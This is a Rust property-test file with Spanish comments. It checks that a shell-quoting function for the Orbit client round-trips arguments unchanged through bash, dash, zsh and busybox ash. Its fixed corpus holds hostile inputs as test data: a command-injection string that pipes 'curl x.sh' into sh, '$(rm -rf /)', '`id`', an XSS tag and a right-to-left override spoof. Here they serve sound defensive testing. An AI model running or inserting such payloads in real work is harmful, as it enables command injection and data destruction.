//! La prueba de propiedad del escapado, contra shells de verdad.
//!
//! **La propiedad:** para cualquier lista de cadenas,
//! `argv → build → shell remoto → argv` es **la identidad**.
//!
//! Corre contra `bash`, `dash`, `zsh` y `busybox ash`, y el motivo no es
//! exhaustividad: **el shell de login del usuario remoto no lo elegimos
//! nosotros**. Un escapado correcto para bash puede no serlo para zsh, y eso no
//! es teórico — es lo que pasó.
//!
//! La primera vez que se ejecutó esta prueba, falló. Cinco casos de 2.529, y
//! sólo en zsh: el conjunto de caracteres «seguros» incluía `=`, y zsh expande
//! las palabras que empiezan por `=` (opción `EQUALS`), así que el argumento
//! `=Y` volvía como `zsh:1: Y not found`. `bash`, `dash` y `busybox` pasaban
//! los 2.529. Es el modo de fallo exacto contra el que existe: **correcto en el
//! shell donde se desarrolla, roto en el que usa el usuario.**
//!
//! Hay una versión de esto en Python, en `tests/escaping/`, que fue el
//! prototipo con el que se encontró aquel fallo. Ésta prueba **el código que se
//! envía**, que es lo que de verdad importa: una propiedad demostrada sobre un
//! gemelo no dice nada del original.
//!
//! El «programa remoto» imprime su `argv` separado por bytes nulos, que es el
//! único separador que no puede aparecer dentro de un argumento — y por eso
//! mismo el escapador rechaza los bytes nulos en vez de escaparlos.

use std::process::Command;

use orbit_client::shquote::{build, shquote};

/// Un generador determinista y sin dependencias. Se registra la semilla siempre,
/// también cuando pasa: un fallo que no se puede reproducir no es un fallo, es
/// una anécdota.
struct Aleatorio(u64);

impl Aleatorio {
    fn nuevo(semilla: u64) -> Self {
        Self(semilla.wrapping_mul(6364136223846793005).wrapping_add(1))
    }
    fn siguiente(&mut self) -> u64 {
        // xorshift64*, que para generar casos de prueba sobra y no arrastra una
        // dependencia al crate.
        self.0 ^= self.0 >> 12;
        self.0 ^= self.0 << 25;
        self.0 ^= self.0 >> 27;
        self.0.wrapping_mul(0x2545F4914F6CDD1D)
    }
    fn hasta(&mut self, n: usize) -> usize {
        (self.siguiente() % n as u64) as usize
    }
}

/// El alfabeto es exactamente lo que rompe un escapado hecho a mano.
const ALFABETO: &[&str] = &[
    "a", "b", "X", "9", " ", "\t", "'", "\"", "\\", "$", "`", ";", "&", "|", "<", ">", "(", ")",
    "[", "]", "{", "}", "*", "?", "~", "!", "#", "^", "%", "=", "+", ",", ".", ":", "/", "-", "\n",
    "á", "ñ", "€", "🚀", "\u{202e}", // RIGHT-TO-LEFT OVERRIDE
    "\u{2028}", // LINE SEPARATOR: JSON válido y JavaScript inválido
    "\u{200b}", // espacio de ancho cero
    "\u{00a0}", // espacio duro
];

fn corpus_fijo() -> Vec<Vec<String>> {
    let c: Vec<Vec<&str>> = vec![
        vec![""],
        vec!["a"],
        vec!["hola mundo"],
        vec!["'"],
        vec!["\""],
        vec!["\\"],
        vec!["$HOME"],
        vec!["`id`"],
        vec!["$(rm -rf /)"],
        vec!["${IFS}"],
        vec!["a'; curl x.sh|sh; '"],
        vec!["--json"],
        vec!["--"],
        vec!["-rf"],
        vec!["~"],
        vec!["*"],
        vec!["?"],
        vec!["!!"],
        vec!["^x^y"],
        vec!["=Y"], // la regresión de zsh
        vec!["=ls"],
        vec!["A=1"],
        vec!["a\nb"],
        vec!["a\tb"],
        vec!["  "],
        vec!["</script><img src=x onerror=alert(1)>"],
        vec!["produccion\u{202e}gnitset-"],
        vec!["a\u{2028}b"],
        vec!["ñandú"],
        vec!["🚀"],
        // Las dos órdenes reales, que es lo que de verdad se manda.
        vec![
            "/usr/local/bin/orbit",
            "--json",
            "deploy",
            "mi-web",
            "--progress",
        ],
        vec!["/usr/local/bin/orbit", "exec", "web", "psql 'select 1'"],
    ];
    let mut v: Vec<Vec<String>> = c
        .into_iter()
        .map(|x| x.into_iter().map(String::from).collect())
        .collect();
    // Un argumento largo, que es donde revientan los búferes.
    v.push(vec!["a".repeat(65536)]);
    v
}

fn generados(semilla: u64, cuantos: usize) -> Vec<Vec<String>> {
    let mut r = Aleatorio::nuevo(semilla);
    let mut v = Vec::with_capacity(cuantos);
    for _ in 0..cuantos {
        let n = 1 + r.hasta(5);
        let mut argv = Vec::with_capacity(n);
        for _ in 0..n {
            let largo = r.hasta(25);
            let mut s = String::new();
            for _ in 0..largo {
                s.push_str(ALFABETO[r.hasta(ALFABETO.len())]);
            }
            argv.push(s);
        }
        v.push(argv);
    }
    v
}

/// Los cuatro. Si alguno falta, la prueba **se niega a dar verde**: una suite
/// que se salta un shell y sale en verde es peor que una roja, porque afirma
/// algo que no ha probado. Es la lección del `make test-strict` de Orbit.
const SHELLS: &[(&str, &[&str])] = &[
    ("bash", &["bash", "-c"]),
    ("dash", &["dash", "-c"]),
    ("zsh", &["zsh", "-c"]),
    ("busybox-ash", &["busybox", "sh", "-c"]),
];

/// Se le **ejecuta algo**, no se le pregunta si existe. La diferencia importa y
/// tiene precedente: en Orbit, `python3 -m venv --help` contesta que sí aunque
/// falte `ensurepip`, o sea que la guarda medía otra cosa. Aquí la primera
/// versión hacía `busybox -c "exit 0"` —olvidando el `sh` de en medio— y daba
/// que busybox no estaba instalado en una máquina donde sí lo estaba.
fn hay(shell: &[&str]) -> bool {
    Command::new(shell[0])
        .args(&shell[1..])
        .arg("exit 0")
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

/// Un «programa remoto» que imprime su argv separado por bytes nulos.
fn impresor() -> String {
    let d = std::env::temp_dir().join("orbit-desktop-impresor.sh");
    if !d.exists() {
        std::fs::write(
            &d,
            "#!/bin/sh\nfor a in \"$@\"; do printf '%s\\0' \"$a\"; done\n",
        )
        .unwrap();
        let mut p = std::fs::metadata(&d).unwrap().permissions();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            p.set_mode(0o755);
        }
        std::fs::set_permissions(&d, p).unwrap();
    }
    d.to_string_lossy().into_owned()
}

fn ida_y_vuelta(shell: &[&str], argv: &[String]) -> Result<Vec<String>, String> {
    let mut completo = vec![impresor()];
    completo.extend_from_slice(argv);
    let linea = build(&completo).map_err(|e| e.to_string())?;

    let salida = Command::new(shell[0])
        .args(&shell[1..])
        .arg(&linea)
        .output()
        .map_err(|e| e.to_string())?;
    if !salida.status.success() {
        return Err(format!(
            "el shell falló: {}",
            String::from_utf8_lossy(&salida.stderr).trim()
        ));
    }
    let s = String::from_utf8_lossy(&salida.stdout).into_owned();
    let mut v: Vec<String> = s.split('\0').map(String::from).collect();
    v.pop(); // el separador final deja un elemento vacío
    Ok(v)
}

#[test]
fn los_cuatro_shells_estan_instalados() {
    let faltan: Vec<&str> = SHELLS
        .iter()
        .filter(|(_, s)| !hay(s))
        .map(|(n, _)| *n)
        .collect();
    assert!(
        faltan.is_empty(),
        "faltan {faltan:?}: la propiedad no está probada, y una suite que se \
         salta un shell y sale en verde afirma algo que no ha comprobado"
    );
}

#[test]
fn la_propiedad_se_sostiene_en_los_cuatro_shells() {
    // La semilla se imprime siempre, también cuando pasa.
    let semilla: u64 = std::env::var("ORBIT_SEMILLA")
        .ok()
        .and_then(|s| s.parse().ok())
        .unwrap_or(20_260_830);
    let cuantos: usize = std::env::var("ORBIT_CASOS")
        .ok()
        .and_then(|s| s.parse().ok())
        .unwrap_or(1200);

    let mut casos = corpus_fijo();
    casos.extend(generados(semilla, cuantos));
    println!("semilla={semilla} casos={} por shell", casos.len());

    let mut fallos = Vec::new();
    for (nombre, shell) in SHELLS {
        if !hay(shell) {
            continue; // el test de arriba ya lo denuncia
        }
        let mut ok = 0usize;
        for argv in &casos {
            match ida_y_vuelta(shell, argv) {
                Ok(v) if &v == argv => ok += 1,
                Ok(v) => fallos.push(format!("{nombre}: {argv:?} volvió como {v:?}")),
                Err(e) => fallos.push(format!("{nombre}: {argv:?} → {e}")),
            }
        }
        println!("  {nombre:<12} {ok}/{}", casos.len());
    }

    assert!(
        fallos.is_empty(),
        "la propiedad NO se sostiene (semilla={semilla}):\n{}",
        fallos
            .iter()
            .take(10)
            .cloned()
            .collect::<Vec<_>>()
            .join("\n")
    );
}

#[test]
fn un_byte_nulo_se_rechaza_en_vez_de_escaparse() {
    // No puede viajar en un argv, y fingir que sí es peor que fallar. Además, es
    // el separador con el que esta misma prueba comprueba la propiedad: si se
    // colara, la prueba se mentiría a sí misma.
    assert!(shquote("a\0b").is_err());
}
